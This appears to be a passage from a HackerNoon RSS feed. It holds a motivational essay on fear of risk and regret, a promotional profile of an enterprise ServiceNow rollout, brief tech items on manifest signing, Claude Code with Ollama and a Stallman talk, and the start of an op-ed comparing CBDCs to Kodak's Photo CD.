The worst-case scenario is some people don’t resonate with your ideas.All survivable. All recoverable. All ultimately beneficial in terms of learning and growth.But your brain can’t process that distinction. When you consider making a bold move - starting a business, publishing creative work, changing careers - your threat detection system treats it like mortal danger.The anxiety you feel isn’t proportional to the actual risk. It’s proportional to how your ancient brain categorizes the situation.And it categorizes all uncertainty as potential death.This gets amplified by a well-documented cognitive bias called loss aversion.Psychological research consistently shows that humans feel losses approximately 2-2.5x more intensely than equivalent gains.Losing $100 feels much worse than gaining $100 feels good. The pain of rejection hits harder than the pleasure of acceptance. The fear of failure weighs more heavily than the excitement of potential success.This made sense for survival. Missing one meal was more immediately dangerous than finding extra food was beneficial. Losing social status in a small tribe had severe consequences. Avoiding threats was more critical than pursuing opportunities.But in the modern world, where most risks are survivable and most losses are recoverable, loss aversion becomes a systematic source of bad decisions.Overweight small, temporary losses (time, money, ego)Underweight large, lasting gains (career transformation, financial freedom, personal growth)Avoid actions with asymmetric upside because you can’t stop fixating on the downsideStay in situations that are “okay” because changing feels like risking a lossYour brain is optimized for surviving threats, not capitalizing on opportunities.And in a world where threats are mostly non-fatal and opportunities are abundant, that optimization makes you systematically worse at assessing risk.Here’s where it gets insidious.You don’t just feel the fear. You rationalize it.You’re smart. You’re analytical. So your brain provides you with sophisticated-sounding reasons for why you shouldn’t try:“I need to be more prepared first.” “I should wait for better market conditions.” “I don’t have the resources yet.” “I need to research more before I commit.”These sound like rational calculations. They feel like smart risk management.But they’re not. They’re your threat detection system generating cover stories for the fear you don’t want to admit you’re feeling.You’re not being careful. You’re being scared and dressing it up in the language of prudence.And because you’re smart, you’re very good at this. You can build an entire intellectual framework around why now isn’t the right time. You can create spreadsheets that “prove” the risk is too high. You can cite examples of people who failed to validate your caution.But strip away the sophistication and here’s what’s actually happening:Your amygdala sees uncertainty. It generates fear. Your prefrontal cortex - the part that handles reasoning - works backwards to justify that fear with logic.You’re using math to rationalize emotion, not to make optimal decisions.And you know this is true because of what happens when you see other people take the exact bet you’re avoiding:You don’t think “Good, they confirmed my analysis was correct.”You think “Damn, I should have done that.”Here’s where it gets really insidious.Not only does your brain overestimate the risk of action, it also creates an illusion that inaction is safe.Staying at your job feels safe because it’s familiar. The pattern is established. You know what to expect.Not starting the business feels safe because you’re not exposing yourself to potential failure. You’re not risking embarrassment.Keeping your ideas private feels safe because you’re not subjecting them to judgment or rejection.But that feeling of safety is an illusion.Your job can disappear tomorrow. Companies restructure. Industries shift. The “stability” of employment is often just the absence of immediate threat, not actual security. You think you’re safe because you’re on payroll, but you’re actually maximally exposed - your entire income depends on one decision-maker who doesn’t owe you anything.Not starting the business means you’re entirely dependent on someone else’s decisions about your income. That’s not safe. That’s vulnerable. That’s putting all your risk into one basket labeled “employment” and hoping nobody drops it.Keeping your ideas private means you never develop them, never test them, never build anything of your own. That’s not safe. That’s guaranteeing you’ll never have the resources or leverage that come from building in public.The safe path isn’t actually safe. It’s just familiar.And your brain confuses familiarity with security.Here’s the thought that should haunt you: The riskiest thing you can do is to spend your entire life avoiding risk.Because while you’re busy playing it safe, the world is changing around you. The job you think is secure becomes obsolete. The industry you thought was stable gets disrupted. The career path you thought was guaranteed disappears.And when that happens - when the “safe” choice reveals itself as an illusion - you have nothing. No skills from attempting bold things. No network from building in public. No track record of betting on yourself. No resilience from failing and recovering.You optimized for safety and ended up with fragility.The people who took the “risky” bets? They built anti-fragility. They developed the capacity to survive failure. They created options. They’re not dependent on one income source, one employer, one path.You’ve been calculating risk backwards your entire life.This is why people stay in jobs they hate for decades. Why they remain in relationships that aren’t working. Why they never pursue the things they claim they want to do.Not because they’re lazy or stupid. Because their threat detection system is wired to prefer the familiar danger over the unfamiliar opportunity.The devil you know feels safer than the devil you don’t - even when the devil you know is slowly destroying your potential and the devil you don’t is actually just an opportunity in disguise.You’re not playing it safe. You’re playing not to lose. And playing not to lose is the only guaranteed way to lose.When you make that calculation conscious and explicit, you can see past the emotional response to the underlying reality:In a world where failure isn’t fatal, the asymmetry favors action.The biggest risk isn’t trying and failing. It’s letting an outdated survival mechanism dictate your entire life trajectory.The people who win aren’t smarter than you. They’re not more talented. They’re not luckier. They just have a higher tolerance for feeling scared while doing the thing anyway.That’s it. That’s the only difference.Now let’s talk about what that faulty calculation is actually costing you.III - The Guaranteed Cost of Never Trying“Twenty years from now you will be more disappointed by the things you didn’t do than by the ones you did.”But let’s say you don’t take the bet.You decide the risk is too high. You stay where you are. You keep preparing, keep planning, keep waiting for certainty.Most people think the cost is zero. They think “no decision” means “no risk.”They’re catastrophically wrong.The cost of not trying isn’t zero. It’s regret. And regret isn’t survivable. It’s permanent.I need to be very direct about this because it’s the part of the equation that people systematically ignore until it’s too late.When you try something and fail, here’s what actually happens:You feel disappointed for a period of time. Days, maybe weeks.Then you process it. You extract the lessons. You identify what didn’t work. You develop skills from the attempt. You have concrete data about what to avoid next time.You move forward with more information, more experience, and more resilience than you had before the attempt.The failure resolves. It becomes a data point. Eventually, it becomes a story you tell about your journey.I’ve failed at multiple business ideas. A clothing brand that never sold a single item. A software product that took six months to build and zero people wanted. Content projects that went nowhere.Do those failures haunt me? No.They taught me what markets don’t want. They showed me what approaches don’t work. They built my tolerance for rejection and uncertainty. They’re now just part of the path that led to the things that did work.Failure is temporary data collection.But when you don’t try - when you stay in the safe lane, when you keep preparing indefinitely, when you wait for certainty that will never come - here’s what happens:And that nothing You’re 30. You have an idea for a business. You don’t start because you’re “not ready.” You tell yourself you’ll do it when you have more savings, more skills, more certainty.You’re 35. The idea is still there. So is the hesitation. You’re busier now. The excuse shifts to “I don’t have time.” You watch someone else launch something similar. It hurts, but you convince yourself they probably got lucky or had advantages you don’t have.Here’s what you don’t say out loud: You spend 10 hours a week on Netflix, social media, and activities that don’t matter. You “don’t have time” the same way people “can’t afford” the gym membership but can afford daily coffee. Time isn’t the constraint. Courage is.You’re 40. The idea has been with you for a decade. You’ve refined it in your head. You know exactly how you’d do it. But now the excuse is “I’m too old to start over” or “I have too many responsibilities.”The truth you won’t admit: You’re more afraid now than you were at 30. Because now you have a decade of evidence that you’re someone who doesn’t follow through. And starting would mean confronting that identity.You’re 50. You don’t think about the idea as much. It’s been relegated to the “could have been” section of your mind. But every time you see someone doing what you wanted to do, something twists in your chest.And you tell yourself a story: “I had too many obligations.” “The timing was never right.” “I couldn’t afford to take the risk.”But the real story is simpler: You were scared. And you let that fear make your decisions for you for 20 years.You’re 60. The idea is a ghost. You tell younger people “I always wanted to do something like that” with a wistful tone that carries two decades of accumulated regret.You’re 70. You’re talking to your grandkids. They ask about your life. You have the job history, the stability, the safety. But there’s an absence. A path not taken. A version of yourself that never got to exist.I’ve had this exact conversation with dozens of people in their 40s, 50s, 60s. The details change but the pattern is always the same: an idea they saw clearly, a move they knew they should make, years of rational-sounding excuses, and now a quiet weight they carry everywhere.Here’s the truth that should shatter your entire risk calculation: You’re not avoiding the bet. You’re already taking it.Every day you don’t try is a bet. A bet that staying the same is better than trying and failing. A bet that comfort today is worth regret tomorrow. A bet that your fear is giving you accurate information about the future.You’re betting on yourself either way. The only question is what version of yourself you’re betting on.The one who tries and maybe fails? Or the one who never tries and definitely wonders?Not failure. Not embarrassment. Not lost time or money.Permanent uncertainty about who you could have become. A life spent wondering “what if?”And unlike a failed business or a rejected pitch or a product that didn’t sell, you can’t recover from that. You can’t A/B test it. You can’t iterate. You can’t go back and try.The opportunity window closes. The market shifts. Your energy changes. Your circumstances evolve. And the version of your life where you found out what was possible disappears forever.They all say the same thing, in different words:“I had this idea when I was younger. I knew what I wanted to build. I saw the opportunity clearly. But I was scared. I told myself it was too risky. I convinced myself I needed to be more prepared. Now I watch other people - often less capable people - doing exactly what I wanted to do. And I can’t stop thinking about what my life would look like if I had just tried.”The regret isn’t just about the missed opportunity. It’s about not knowing who they could have been. It’s about a door that’s now permanently closed.Here’s the mathematical truth nobody wants to confront:The probability of regret from not trying approaches 100% over a sufficient time horizon.The probability of catastrophic, unrecoverable failure from trying approaches 0%.You will never know if it could have worked (100% certainty of permanent uncertainty)You will watch others succeed in spaces you wanted to enter (compounds regret)You will accumulate “what if” thoughts that become more painful over timeYou will reach a point where the opportunity is no longer availableYou will face the reality that you let fear dictate your choicesAll of those outcomes are guaranteed. That’s not risk. That’s certainty.If you do try and it fails:You learn what doesn’t work (valuable)You develop skills from the attempt (transferable)You build resilience and reduce future fear (compounds capability)You have data for your next attempt (actionable)You move forward without the weight of wonderingThe “catastrophic failure” scenarios people imagine - complete financial ruin, total social ostracism, permanent career damage - almost never happen in reality.What actually happens: You’re out some time and money. Your ego bruises. You feel disappointed. Then you recover and try something else.You’re not avoiding risk by staying where you are. You’re just choosing a different, more painful, more permanent form of risk.The risk of action: Temporary discomfort, recoverable losses, valuable learning.The risk of inaction: Permanent regret, compounding opportunity cost, lifelong wondering.When you frame it correctly, the choice is obvious.This is what people mean when they say “the greatest risk is no risk at all.”Not because safety is impossible. But because the risk of a life unlived - the risk of reaching the end and realizing you never let yourself try - is worse than any survivable failure you could experience along the way.And here’s the cruel irony: the people who take the calculated bets, who try and sometimes fail, who build the tolerance for uncertainty - they’re the ones who end up with fewer regrets.Not because everything they try works. But because they know. They have data. They don’t wonder. They tried, they learned, they moved forward.The people who spend their lives avoiding risk? They’re the ones carrying the heaviest burden. The weight of all the unlived possibilities. All the versions of themselves they never let exist.That’s not safety. That’s a different kind of prison.IV - How To Actually Bet On Yourself (And Why You Won’t)But before I give you the steps, let me tell you what’s about to happen.You’re going to read these steps. You’re going to think “This is useful.” You might even screenshot them.And then you’re going to close this newsletter and do exactly what you were doing before you opened it.You’ll tell yourself “I’ll come back to this later.” You’ll save it in a folder labeled “Important.” You’ll add it to your ever-growing list of things you’re going to do “when you have time.”But later never comes. And you know it.Because this isn’t the first article you’ve read about taking action. This isn’t the first framework you’ve saved. This isn’t the first time you’ve felt motivated to start.It’s just the latest iteration of a pattern you’ve been running for years: consume information about change, feel inspired, do nothing.So let me be very clear about something:These steps only work if you actually do them. And you’re not going to do them unless you admit something uncomfortable first.You don’t have an information problem. You have a courage problem.You don’t need more frameworks. You need to stop pretending that one more system will be the thing that finally makes you feel ready.You’re not going to feel ready. Ever. The only way forward is to act before you feel ready.So here’s what to actually do - not because you need it, but because if you’re going to ignore it like you’ve ignored every other framework, I want you to at least be conscious about what you’re choosing.Start With The Smallest Asymmetric BetYou don’t have to quit your job tomorrow. You don’t have to bet everything on one idea. You don’t have to make a dramatic, all-or-nothing move.Start with the smallest bet that still has asymmetric upside.The kind of bet where the downside is so small it’s almost negligible, but the upside could be transformative.Publish one piece of writing online.Downside: 2 hours to write and edit. Maybe nobody reads it. You feel slightly vulnerable.Upside: It resonates with someone. They share it. It reaches people you don’t know. It opens a conversation. It demonstrates your thinking. It’s the first step toward building an audience.Reach out to one person you admire.Downside: 10 minutes to write a thoughtful email. They don’t respond. Your ego feels a small sting.Upside: They respond. You have a conversation. They share an insight that shifts your entire approach. They introduce you to someone in their network. They become a mentor. They hire you.Ship one small product or service.Downside: 20-40 hours to build something simple. You put a landing page up. Nobody buys. You feel disappointed.Upside: 10 people buy. You make $500. You prove you can create value people will pay for. You validate an idea. You have a foundation to build on. You gain confidence to create more.Record one video or podcast episode.Downside: 3 hours to plan, record, and publish. It gets 20 views. You cringe at the sound of your own voice.Upside: 100 people watch. Some of them subscribe. One person shares it. It starts a conversation. You develop the skill. You realize you enjoy the medium. It becomes a weekly practice that builds into something meaningful over time.The downside is so small - a few hours, temporary discomfort, maybe $100 - that it barely matters.The upside is completely disproportionate - skills, connections, opportunities, proof of concept, momentum.That’s asymmetry at the micro level.Before you take any of these bets, run this exercise. Tim Ferriss calls it “fear-setting” - a systematic way to define your fears instead of letting them define you.Take the bet you’re considering. Write it at the top of a page. Then create three columns: - What’s the worst that could realistically happen? Be specific. Not vague anxiety, but concrete outcomes. “I waste 3 months and $500.” “Nobody reads it and I feel stupid.” Write down every fear. - For each fear, what could you do to reduce the likelihood? “Start with a smaller version - 1 month and $100.” “Share with a small group first.” Most fears can be mitigated with basic precautions. - If the worst case happens, how would you recover? “I could save $500 in two months.” “I could use what I learned to try a different approach.” Be specific about the recovery path.What you’ll discover when you write it out is that the worst case is: unlikely to happen, not that bad, and recoverable.Most of your fears dissolve when you define them specifically.The vague anxiety of “what if it doesn’t work” feels insurmountable. But “I’ll be out $500 and some time, and I can recover both in two months” is manageable.That’s the difference between imagined catastrophe and actual risk.Pick one small bet. The smallest one that scares you just enough to matter.And do it in the next 7 days.Not eventually. Not when you’re ready. In the next 7 days.Do the thing. Ship the thing. Hit publish. Send the email. Launch the offer.Then take another bet. Then another. Build the pattern.Each bet de-risks the next one because you’re developing skills, building resilience, and accumulating proof that you can survive uncertainty.Let me tell you what’s really happening right now.You’re reading this newsletter. You’re nodding along. You’re thinking “This makes sense. The math is clear. I should take more asymmetric bets.”And tomorrow, you’ll do nothing.You’ll go back to your job. You’ll scroll social media. You’ll think about starting that project. You’ll tell yourself “soon.”You’ll make the same calculation you’ve been making for years: The risk is too high. I’m not ready. I need more time.And the days will stack into weeks. The weeks into months. The months into years.And five years from now, you’ll be reading another article about asymmetric upside and thinking “This makes sense” and doing nothing.Because here’s what you haven’t realized yet: understanding the math changes nothing.You already knew most of this before you started reading. You already knew that the downside of trying is survivable. You already knew that regret is worse than failure. You already knew that smart people stay stuck not because they’re stupid but because they’re scared.You didn’t need me to explain asymmetric upside. You needed me to give you permission to keep waiting.And I’m not giving you that permission.The asymmetry of upside makes bold moves mathematically smart. That’s not inspiration. That’s fact.The downside of trying and failing is usually survivable. You recover. You learn. You move forward. That’s data.The downside of never trying is guaranteed regret. You never know. You never build. You spend decades wondering what could have been. That’s certainty.Bet on yourself more often. The expected value is higher than you think. That’s math.But none of that matters if you don’t actually do the thing.And you know what the thing is. You’ve known for months. Maybe years.It’s the project you keep planning but never starting.It’s the email you keep drafting but never sending.It’s the business idea you keep refining but never launching.It’s the content you keep researching but never creating.It’s the bet you keep calculating but never taking.You know exactly what it is. The thing that would change everything if you just did it. The thing that scares you precisely because it matters.Here’s the uncomfortable truth you’ve been avoiding:You’re not actually trying to make a smart decision. You’re trying to find a mathematical justification for your fear.The spreadsheet is cover. The research is procrastination. The “one more course” is avoidance.You don’t need more information. You don’t need better tools. You don’t need perfect conditions.You need to stop lying to yourself about why you haven’t started.And the biggest lie you tell yourself?“I’ll do it when I’m ready.”But here’s what “ready” actually means in your internal calculus: “When it doesn’t feel scary anymore. When I’m guaranteed not to fail. When I’m certain it will work.”You will never feel ready. The fear will never fully go away. The uncertainty will never completely resolve.The people who succeed at the things you want to do aren’t more ready than you. They’re not more talented. They’re not more prepared.They just started before they felt ready. They took the bet while it still scared them. They understood that the feeling of readiness comes AFTER you start, not before.So here’s the only question that matters:Are you going to make the same excuses next year?Because that’s the actual decision you’re making right now. Not “should I start this thing.” You already know you should.The decision is: Am I the kind of person who lets fear make my decisions? Or am I the kind of person who runs the math and makes the bet?The math is clear. The asymmetry is obvious. The only question is: what are you going to do about it?]]></content:encoded></item><item><title>Aravind Barla Rebuilt Enterprise Service Delivery for 100,000+ Employees</title><link>https://hackernoon.com/aravind-barla-rebuilt-enterprise-service-delivery-for-100000-employees?source=rss</link><author>Sanya Kapoor</author><category>tech</category><pubDate>Sun, 25 Jan 2026 19:50:25 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[In the increasingly complex landscape of enterprise service management, the remarkable transformation led by Aravind Barla at a global Fortune 100 company stands as a compelling testament to visionary leadership and strategic technical execution. This next-generation Employee Experience Platform (EXP) implementation, serving over 100,000 employees across multiple continents, has redefined industry standards for service delivery integration and AI-driven automation while establishing new benchmarks for what's possible in large-scale digital transformation initiatives.Inheriting a Fragmented EcosystemWhen Aravind Barla stepped into the technical leadership role for this ambitious project in early 2023, the organization was struggling with deeply entrenched challenges that had evolved over decades of technological evolution. Service delivery across IT, HR, and Workplace teams operated in isolated silos, creating inconsistent user experiences, redundant processes, and frustrating inefficiencies that affected every level of the organization. Employee satisfaction scores had reached concerning lows, with internal surveys revealing that employees spent an average of 5.2 hours per week navigating various service portals and tracking request statuses.\
The financial impact of this fragmentation was equally troubling. The operational overhead of maintaining multiple disconnected systems was draining approximately $4.7 million in annual resources, while the productivity loss from inefficient service delivery was estimated at over $9 million yearly. Previous attempts to address these issues had resulted in only incremental improvements, with departmental boundaries and technical debt presenting seemingly insurmountable obstacles.\
The complexity of unifying service delivery across an organization of this scale presented formidable challenges that had derailed similar initiatives. Two previous implementation attempts had stalled due to cross-departmental resistance, technical integration challenges, and the sheer complexity of standardizing processes across global operations. What the company needed was not just technical expertise, but a leader who could align diverse stakeholders around a unified vision while delivering a technically robust solution that would scale across the enterprise.Architectural Vision and Implementation StrategyAt the heart of Aravind's approach was a commitment to fundamentally reimagine how employees interacted with enterprise services. Rather than pursuing incremental improvements to existing systems, he championed a comprehensive transformation built on ServiceNow's platform capabilities, enhanced by custom AI implementations, virtual agents, and intelligent workflow automation. His vision extended beyond technical architecture to encompass the entire employee journey – from initial need identification through to resolution and feedback.\
Aravind Barla assembled an initial discovery team comprising business analysts, UX researchers, and service delivery leaders to conduct a thorough assessment of the current state. This six-week investigation revealed that employees were navigating an average of 12 different portals for various service needs, with inconsistent terminology, conflicting interfaces, and redundant data entry requirements creating significant friction. Armed with these insights, Aravind developed a comprehensive transformation roadmap that balanced quick wins with long-term structural improvements.\
The cornerstone of this strategy was a unified intake layer that would serve as the foundation for enterprise service delivery. Aravind personally architected this sophisticated system, consolidating over 15 legacy intake points into a single, intuitive portal accessible across all devices and locations. He pioneered the implementation of natural language processing capabilities that could interpret employee requests regardless of the terminology used, effectively breaking down the language barriers between departments.\
Perhaps most impressively, he introduced a revolutionary new taxonomy for service categorization that created a common language across previously siloed departments. This standardized approach to service classification required extensive collaboration with subject matter experts from each functional area, with Aravind facilitating numerous workshops to build consensus around the new framework. His diplomatic skills proved as valuable as his technical expertise during this critical phase, as he navigated competing priorities and entrenched departmental perspectives.\
The technical implementation phase showcased Aravind Barla's exceptional leadership capabilities under pressure. He assembled and guided a cross-functional team of 18 developers, UX specialists, and business analysts, fostering a collaborative environment despite aggressive timelines and complex integration challenges. His hands-on approach to designing end-to-end workflow automation ensured that the theoretical architecture translated into practical, efficient solutions that would deliver measurable business value.\
Throughout the development process, Aravind instituted weekly stakeholder reviews and bi-weekly user testing sessions, creating a feedback loop that allowed for continuous refinement. This iterative approach enabled the team to identify and address potential issues early, resulting in a solution that not only met technical requirements but truly resonated with end users. His insistence on maintaining this rigorous review process, despite timeline pressures, proved instrumental in delivering a platform that achieved exceptional adoption rates.Breakthrough Results and Organizational ImpactThe results of Aravind Barla's implementation were both immediate and substantial, exceeding expectations across all key performance indicators. Within the first quarter of launch, the platform had achieved a remarkable 70% increase in self-service adoption – a metric that directly translated to significant operational efficiencies and enhanced user satisfaction. Average resolution times for employee requests plummeted from 72 hours to under 24 hours, representing a transformative improvement in service delivery speed and quality.The financial impact was equally impressive and provided clear validation of the investment in this initiative. By automating more than 65% of Tier-1 service requests through intelligent virtual agents and workflow automation, the platform enabled annual cost savings of $3.2 million in operational overhead. This achievement alone would have justified the implementation, but the qualitative improvements were perhaps even more significant in terms of organizational impact.\
Employee satisfaction scores rose by 40% within the first quarter, creating a measurable improvement in workforce experience across the global organization. This improvement was particularly notable among remote and hybrid workers, who reported feeling more connected to organizational support systems through the unified platform. The implementation also yielded unexpected benefits in terms of data visibility and analytics, providing leadership with unprecedented insights into service demand patterns and operational bottlenecks.\
The platform's success during a period of significant organizational change further demonstrated its resilience and value. During a major acquisition that brought 12,000 new employees into the organization, Aravind Barla's system seamlessly expanded to accommodate the increased load and new service requirements, maintaining performance standards throughout the integration process. This scalability validated his architectural decisions and reinforced the strategic value of the implementation.Industry Recognition and Career AdvancementThe exceptional performance and innovative approach demonstrated by Aravind quickly garnered attention both within and beyond the organization. His implementation became the subject of an in-depth industry case study highlighting best practices in enterprise service management and AI-driven automation. A prominent technology publication featured the project in a press article showcasing innovative applications of AI in employee services, positioning both Aravind and the organization as thought leaders in digital workplace transformation.\
At technology conferences across North America, the implementation was referenced as a model example of successful enterprise service integration, with several competitors subsequently launching similar initiatives based on the framework Aravind had pioneered. This industry recognition not only elevated the organization's reputation for innovation but created valuable recruitment advantages in attracting top technical talent.\
Within the organization, Aravind's leadership earned him a promotion to technical lead for enterprise automation strategy – a role that expanded his influence across the company's global technology initiatives and positioned him as a key advisor to the CIO on future digital transformation efforts. His team members also benefited from their association with the successful project, with several receiving promotions and recognition for their contributions.\
Most significantly, the framework Aravind developed has since been adapted by multiple business units worldwide, creating a lasting legacy that extends far beyond the initial implementation. The modular architecture he designed has proven flexible enough to accommodate regional variations while maintaining the core benefits of standardization and integration, allowing for global scaling without sacrificing local relevance.For Aravind Barla, this project represented more than just a successful implementation – it marked his evolution from technical practitioner to thought leader and innovator in the enterprise automation space. The approach he pioneered demonstrated how thoughtful architecture, combined with strategic leadership, could overcome entrenched challenges that had previously seemed insurmountable in large-scale enterprise environments.\
The success validated Aravind Barla's fundamental philosophy toward technology implementation: that truly transformative solutions must balance technical excellence with deep understanding of human experience. Throughout the project, he maintained a dual focus on system optimization and user-centered design, recognizing that even the most sophisticated automation would fail without genuine adoption by employees at all levels of the organization.\
His commitment to measuring impact through both quantitative and qualitative metrics established a new standard for evaluating technology investments within the organization. By consistently connecting technical decisions to tangible business outcomes, Aravind changed the conversation around enterprise technology from cost center to value driver, securing executive support for continued innovation in the employee experience space.\
The impact of Aravind's work continues to resonate throughout the organization and beyond its boundaries. By creating a blueprint for intelligent service integration, he has influenced how enterprises approach employee experience design and service delivery automation. His success validates a fundamental principle: that technology implementations, when guided by clear vision and executed with technical excellence, can transform not just systems but the everyday experiences of thousands of employees.As organizations worldwide continue to prioritize digital employee experience in an increasingly distributed work environment, Aravind Barla's implementation stands as a powerful example of how leadership excellence can drive transformative outcomes in enterprise technology. The ripple effects of his innovation continue to expand, inspiring a new generation of technical leaders to pursue similarly ambitious visions for workplace transformation.Aravind Barla is a distinguished leader in enterprise technology innovation, specializing in the intersection of automation, AI, and employee experience solutions. Based in Dublin, California, Aravind combines deep technical expertise with strategic vision to deliver transformative implementations that redefine how organizations approach service delivery and digital employee experience.

It's intended to be used with Sigstore signing and SLSA attestations out of the box (including support for validating policies before pulling files). I wanted to experiment how this could be used to sign and attest k8s manifests the same way we do our images. So I created blob-argo-cmp which combines Blob with an Argo CD CMP to validate and pull manifests. Meaning, not only can you use something like Kyverno to enforce image signing/attestation, but you can also enforce the same policies against your manifests. This is obviously experimental at this point, but you can see a full example that uses KinD and includes both positive/negative verifications. ]]></content:encoded></item><item><title>How to Run Claude Code With Local Models Using Ollama</title><link>https://hackernoon.com/how-to-run-claude-code-with-local-models-using-ollama?source=rss</link><author>Vladislav Guzey</author><category>tech</category><pubDate>Sun, 25 Jan 2026 19:39:03 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[In January 2026, Ollama added support for the Anthropic Messages API, enabling Claude Code to connect directly to any Ollama model.

Speaking about AI, Stallman warned that "nowadays, people often use the term artificial intelligence for things that aren't intelligent at all..." He makes a point of calling large language models "generators" because "They generate text and they don't understand really what that text means." (And they also make mistakes "without batting a virtual eyelash. So you can't trust anything that they generate.") Stallman says "Every time you call them AI, you are endorsing the claim that they are intelligent and they're not. So let's let's refuse to do that." 

"So I've come up with the term Pretend Intelligence. We could call it PI. And if we start saying this more often, we might help overcome this marketing hype campaign that wants people to trust those systems, and trust their lives and all their activities to the control of those systems and the big companies that develop and control them." 

"By the way, as far as I can tell, none of them is free software." 

When it comes to today's cars, Stallman says they contain "malicious functionalities... Cars should not be connected. They should not upload anything." (He adds that "I am hoping to find a skilled mechanic to work with me in a project to make disconnected cars.") 

And later Stallman calls the smartphone "an Orwellian tracking and surveillance device," saying he refuses to own one. (An advantage of free software is that it allows the removal of malicious functionalities.) 

Stallman spoke for about 53 minutes — but then answered questions for nearly 90 minutes longer. Here's some of the highlights...]]></content:encoded></item><item><title>With CBDCs, Central Banks Are Making the Same Mistake Kodak Made</title><link>https://hackernoon.com/with-cbdcs-central-banks-are-making-the-same-mistake-kodak-made?source=rss</link><author>Edwin Liava&apos;a</author><category>tech</category><pubDate>Sun, 25 Jan 2026 19:33:57 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[When Laughter Reveals Everything You Need to KnowAt the World Economic Forum in Davos this week, the French Central Bank Governor laughed. Not a polite chuckle, but an audible dismissal i.e. the kind of laugh that reveals someone hasn't taken the time to understand what they're dismissing. The subject? Bitcoin's potential to compete with fiat currency.His laughter wasn't unique. It echoed through the alpine halls where the architects of the current financial system gather annually to discuss how that system should work. But history has taught us that such laughter is rarely the sound of confidence. More often, it's the sound of an incumbent who hasn't yet been forced to take a threat seriously.And I've heard that laugh before. In boardrooms at Kodak. In executive suites at Blockbuster. In strategy meetings at Nokia. It's the laugh of someone who believes their moat is permanent, their position unassailable, their understanding complete.The Photo CD Parallel - When Innovation Serves The Old ModelIn my previous piece, "," I explored how centralized monetary systems fail to adapt to community needs. But watching Brian Armstrong, CEO of Coinbase, patiently explain Bitcoin's fundamentals to a central banker who clearly hadn't done his homework revealed something even more profound i.e. central banks aren't just resistant to Bitcoin, they're repeating one of history's most spectacular corporate failures.Let me take you back to 1990.Kodak, the undisputed king of photography, stood at a crossroads. Digital photography was emerging, and, ironically, Kodak had invented the first digital camera back in 1975. They had fifteen years to prepare. They had the patents, the technology, the brand recognition, and the market dominance. They had everything except the courage to cannibalize their own business model.So instead of embracing the digital revolution they had pioneered, Kodak launched Photo CD.Photo CD was Kodak's compromise solution, a way to enter the digital age without abandoning film. Customers would still shoot film, still develop film, but then their photos would be scanned onto a proprietary CD format that could be viewed on special Photo CD players. It was digital, technically. But it was digital on Kodak's terms. Digital that still required film. Digital that still generated revenue from Kodak's existing infrastructure.The format was technically impressive. It used a sophisticated color space, multiple resolutions, and even some "super white" information that resembled primitive RAW files. Professional photographers appreciated the quality. But there was one problem i.e., it was a solution designed to preserve the old system, not to embrace the new one.Photo CD required proprietary players ($400 each). It used a format that would later become "orphaned" when Kodak abandoned it. Most damningly, it solved yesterday's problem while the world was already moving toward tomorrow's solution i.e. true digital cameras that eliminated film entirely.By 2004, processing labs were offering to pay people to haul away their Kodak 4050 Photo CD scanners. By 2012, Kodak filed for bankruptcy.CBDCs - The Photo CD of MoneyNow let's talk about Central Bank Digital Currencies (CBDCs).Just as Kodak invented digital photography but refused to fully embrace it, central banks understand that money is going digital. They've watched Bitcoin operate flawlessly for sixteen years. They've seen stablecoins gain adoption. They've witnessed the rise of decentralized finance. They know change is coming.So what's their response? CBDCs, digital currency on their terms. Digital currency that preserves central control. Digital currency that maintains the existing power structure.Like Photo CD, CBDCs are technically sophisticated. They could offer faster payments, programmable money, and improved financial inclusion. Central banks cite these benefits constantly. But scratch the surface, and you'll find the same fundamental flaw that doomed Photo CD, i.e. CBDCs are designed to preserve the old system, not to embrace the new paradigm.Consider what CBDCs actually represent: over a decentralized technologySurveillance capabilities that would make physical cash obsoleteProgrammable restrictions on how you spend your own moneyElimination of financial privacy under the guise of fighting crimeThe same trusted intermediaries in a world that's discovering the value of trustlessnessEven the Federal Reserve has quietly acknowledged that CBDCs are "a solution in search of a problem" in countries like the United States, where digital payment systems already work efficiently.But the most revealing parallel isn't in the technology, it's in the psychology. Just as Kodak's management couldn't imagine a world where people wouldn't need film, central bankers can't imagine a world where people don't need Fiat money. The French Central Bank Governor's laughter at Davos stemmed from the same place as Kodak's dismissal of digital cameras i.e. "This threatens our business model, therefore it must not be serious."When Brian Armstrong Met the Status QuoThe exchange at Davos deserves to be studied in business schools as a case study in how incumbents fail to recognize disruption. Let me walk you through it.Armstrong made a straightforward point i.e. the current fiat system was only created in 1971 when Nixon abandoned the gold standard. Before that, money had some connection to hard assets. Now, democracies worldwide struggle with fiscal discipline, running persistent deficits that cause inflation. Bitcoin represents a return to "sound money", money with a fixed supply that can't be debased.The French Central Bank Governor's response was telling i.e. "Money is part of sovereignty… if we lose that really you lose a key function of democracy."Think about that framing. Not "money is a tool for economic efficiency." Not "money is a neutral medium of exchange." But "money is part of sovereignty", a blunt admission that central banks view money as a tool of state power.When Armstrong pointed out that Bitcoin is even more independent than central banks, having no issuer, no board, no political pressure, no emergency powers, the Governor laughed. Not because Armstrong was wrong. He laughed because Armstrong was so obviously right that it threatened the entire conceptual framework the Governor operates within.The Governor then claimed to trust "independent central banks with a democratic mandate" more than "private issuers of Bitcoin."This revealed a complete misunderstanding of what Bitcoin is. Bitcoin has no issuers, private or otherwise. It's a decentralized protocol. The fact that a central bank governor doesn't grasp this basic point while dismissing Bitcoin is like Kodak's leadership not understanding how a digital sensor works while dismissing digital cameras.It's not confidence. It's ignorance dressed up as authority.The Pattern Repeats ItselfHere's what Kodak's leadership didn't understand i.e. you can't compromise your way through a paradigm shift. You can't preserve the old system while pretending to embrace the new one. The market eventually forces you to choose, and by the time you're forced to choose, it's usually too late.Kodak tried to have it both ways with Photo CD. They tried to preserve film while going digital. They failed.Central banks are trying to have it both ways with CBDCs. They're trying to preserve centralized monetary control while going digital. They will fail for the same reason.The pattern is remarkably consistent across industries: "People will always want the quality and familiarity of film. We'll give them digital as an add on to their film workflow." People wanted the convenience, cost savings, and creative freedom of pure digital photography. Film became a niche product for enthusiasts. "People will always need the stability and legitimacy of state backed money. We'll give them digital currency with all the benefits of crypto, but with trusted institutions still in control." People are discovering the benefits of money that can't be debased, can't be seized arbitrarily, can't be inflated away, and doesn't require permission to use. Fiat is becoming a depreciating medium of exchange while Bitcoin becomes a store of value.Why This Time Really Is DifferentThe central bankers at Davos would 